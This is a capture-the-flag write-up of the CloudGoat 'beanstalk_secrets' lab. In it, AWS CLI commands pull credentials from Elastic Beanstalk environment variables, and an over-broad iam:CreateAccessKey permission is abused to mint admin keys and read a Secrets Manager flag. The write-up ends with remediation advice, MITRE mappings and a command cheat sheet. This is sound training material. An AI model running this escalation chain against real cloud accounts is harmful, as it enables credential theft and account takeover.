# ğŸ¥· CloudGoat: Beanstalk Secrets (AWS CLI)

_Write-up: From low-privilege user to admin (AWS CLI approach)_

ğŸ“… 2026-01-11

## ğŸ§­ Overview

**Scenario:** `beanstalk_secrets` \
**Platform:** [CloudGoat (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/cloudgoat) \
**Tools:** AWS CLI (no exploitation frameworks) \
**Objective:** Extract secrets from Elastic Beanstalk, escalate to admin, and retrieve the flag.

## âš”ï¸ Attack Path Summary

Low-Priv User â†’ Beanstalk Enum â†’ Secondary Creds â†’ IAM Enum â†’ CreateAccessKey â†’ Admin â†’ Flag

## ğŸ”‘ Phase 1: Initial Access

#### Configure Low-Privilege Profile

```bash
aws configure --profile ebs-1
# Access Key: AKIA****************
# Secret Key: EOyTyXYE/DwNCFAHmFSla5SWz**************
```

#### Validate Credentials

```bash
aws sts get-caller-identity --profile ebs-1
```

```json
{
  "UserId": "AIDA****************",
  "Account": "7912********",
  "Arn": "arn:aws:iam::7912********:user/cgid09kivyz0ga_low_priv_user"
}
```

## ğŸ” Phase 2: Elastic Beanstalk Enumeration

#### List Applications

```bash
aws elasticbeanstalk describe-applications --profile ebs-1
```

Found: `cgid09kivyz0ga-app` - *"Elastic Beanstalk application for insecure secrets scenario"*

#### List Environments

```bash
aws elasticbeanstalk describe-environments --profile ebs-1
```

| Property | Value |
|----------|-------|
| Environment | `cgid09kivyz0ga-env` |
| Application | `cgid09kivyz0ga-app` |
| Platform | Python 3.11 on Amazon Linux 2023 |
| Status | Ready |

#### Extract Configuration Settings

```bash
aws elasticbeanstalk describe-configuration-settings \
  --application-name cgid09kivyz0ga-app \
  --environment-name cgid09kivyz0ga-env \
  --query "ConfigurationSettings[0].OptionSettings[?Namespace=='aws:elasticbeanstalk:application:environment']" \
  --output table \
  --profile ebs-1
```

|                   Namespace                   |      Name       |                   Value                    |
|-----------------------------------------------|-----------------------|--------------------------------------------|
|  `aws:elasticbeanstalk:application:environment` |  `PYTHONPATH`           |  `/var/app/venv/staging-LQM1lest/bin`        |
|  `aws:elasticbeanstalk:application:environment` |  `SECONDARY_ACCESS_KEY` |  `AKIA****************`                      |
|  `aws:elasticbeanstalk:application:environment` |  `SECONDARY_SECRET_KEY` |  `19jM1vKF4UQqw8vJo6FwKKxd**************`  |

**Credentials extracted from environment variables.**

## ğŸ‘¤ Phase 3: Pivot to Secondary User

#### Configure Secondary Profile

```bash
aws configure --profile ebs-2
# Access Key: AKIA****************
# Secret Key: 19jM1vKF4UQqw8vJo6FwKKxd**************
```

#### Validate Credentials

```bash
aws sts get-caller-identity --profile ebs-2
```

Confirmed: `cgid09kivyz0ga_secondary_user`

## ğŸ—„ï¸ Phase 4: IAM Enumeration

#### Enumeration Workflow

```
list-users â†’ list-attached-user-policies â†’ get-policy â†’ get-policy-version
```

#### List All Users

```bash
aws iam list-users --profile ebs-2
```

| Username | Note |
|----------|------|
| `cgid09kivyz0ga_admin_user` | **Target** |
| `cgid09kivyz0ga_low_priv_user` | Initial access |
| `cgid09kivyz0ga_secondary_user` | Current user |

#### Enumerate Secondary User's Policies

```bash
aws iam list-attached-user-policies \
  --user-name cgid09kivyz0ga_secondary_user \
  --profile ebs-2
```

```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "cgid09kivyz0ga_secondary_policy",
      "PolicyArn": "arn:aws:iam::7912********:policy/cgid09kivyz0ga_secondary_policy"
    }
  ]
}
```

#### Get Policy Details

```bash
aws iam get-policy \
  --policy-arn arn:aws:iam::7912********:policy/cgid09kivyz0ga_secondary_policy \
  --profile ebs-2
```

Noted `DefaultVersionId: v1`

#### Extract Policy Document

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::7912********:policy/cgid09kivyz0ga_secondary_policy \
  --version-id v1 \
  --profile ebs-2
```

```json
{
  "Statement": [
    {
      "Action": [
        "iam:CreateAccessKey"
      ],
      "Effect": "Allow",
      "Resource": "*"
    },
    {
      "Action": [
        "iam:ListRoles",
        "iam:GetRole",
        "iam:ListPolicies",
        "iam:GetPolicy",
        "iam:ListPolicyVersions",
        "iam:GetPolicyVersion",
        "iam:ListUsers",
        "iam:GetUser",
        "iam:ListGroups",
        "iam:GetGroup",
        "iam:ListAttachedUserPolicies",
        "iam:ListAttachedRolePolicies",
        "iam:GetRolePolicy"
      ],
      "Effect": "Allow",
      "Resource": "*"
    }
  ]
}
```

#### Critical Finding

| Permission | Resource | Impact |
|------------|----------|--------|
| `iam:CreateAccessKey` | `*` (wildcard) | **Can create access keys for ANY user, including admin** |

## ğŸ’¥ Phase 5: Privilege Escalation

#### Create Access Key for Admin User

```bash
aws iam create-access-key \
  --user-name cgid09kivyz0ga_admin_user \
  --profile ebs-2
```

```json
{
  "AccessKey": {
    "UserName": "cgid09kivyz0ga_admin_user",
    "AccessKeyId": "AKIA****************",
    "Status": "Active",
    "SecretAccessKey": "C8aC3UMs1rMewHHLwAHxxk4T**************"
  }
}
```

#### Configure Admin Profile

```bash
aws configure --profile admin
aws sts get-caller-identity --profile admin
```

```json
{
  "UserId": "AIDA****************",
  "Account": "7912********",
  "Arn": "arn:aws:iam::7912********:user/cgid09kivyz0ga_admin_user"
}
```

**Privilege escalation successful.**

## ğŸš© Phase 6: Capture the Flag

#### List Secrets

```bash
aws secretsmanager list-secrets --profile admin --region us-east-1
```

Found: `cgid09kivyz0ga_final_flag`

#### Retrieve Flag

```bash
aws secretsmanager get-secret-value \
  --secret-id cgid09kivyz0ga_final_flag \
  --profile admin \
  --region us-east-1
```

```
FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}
```

## ğŸ“ Attack Chain Diagram

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Low-Priv User     â”‚
â”‚   (ebs-1 profile)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚ elasticbeanstalk:DescribeConfigurationSettings
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Beanstalk Secrets  â”‚
â”‚  - Access Key       â”‚
â”‚  - Secret Key       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Secondary User     â”‚
â”‚   (ebs-2 profile)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚ iam:CreateAccessKey (Resource: *)
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    Admin User       â”‚
â”‚  (admin profile)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚ secretsmanager:GetSecretValue
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚       FLAG          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## ğŸš¨ Vulnerabilities Exploited

| # | Vulnerability | CWE |
|---|---------------|-----|
| 1 | Hardcoded credentials in Beanstalk environment variables | CWE-798 |
| 2 | Overly permissive IAM policy (`iam:CreateAccessKey` on `*`) | CWE-732 |
| 3 | Lack of least privilege principle | CWE-250 |

## ğŸ’¡ Remediation

1. **Do not store long-lived AWS credentials in environment variables** - Use AWS Secrets Manager or SSM Parameter Store
2. **Restrict `iam:CreateAccessKey`** - Scope to `self` only:
   ```json
    {
      "Effect": "Allow",
      "Action": "iam:CreateAccessKey",
      "Resource": "arn:aws:iam::*:user/${aws:username}"
    }
   ```
3. **Enable CloudTrail alerts** for `CreateAccessKey` API calls
4. **Regular IAM Access Analyzer scans** to detect overly permissive policies

## ğŸ¯ MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Credential Access | Unsecured Credentials: Credentials in Files / Environment Variables | T1552.001 |
| Discovery | Cloud Service Discovery | T1526 |
| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 |
| Persistence | Account Manipulation: Additional Cloud Credentials | T1098.001 |

## ğŸ› ï¸ Commands Reference

```bash
# Beanstalk Enumeration
aws elasticbeanstalk describe-applications
aws elasticbeanstalk describe-environments
aws elasticbeanstalk describe-configuration-settings --application-name X --environment-name Y

# IAM Enumeration Workflow
aws iam list-users
aws iam list-attached-user-policies --user-name X
aws iam list-user-policies --user-name X
aws iam get-policy --policy-arn X
aws iam get-policy-version --policy-arn X --version-id vN

# Privilege Escalation
aws iam create-access-key --user-name X

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id X
```
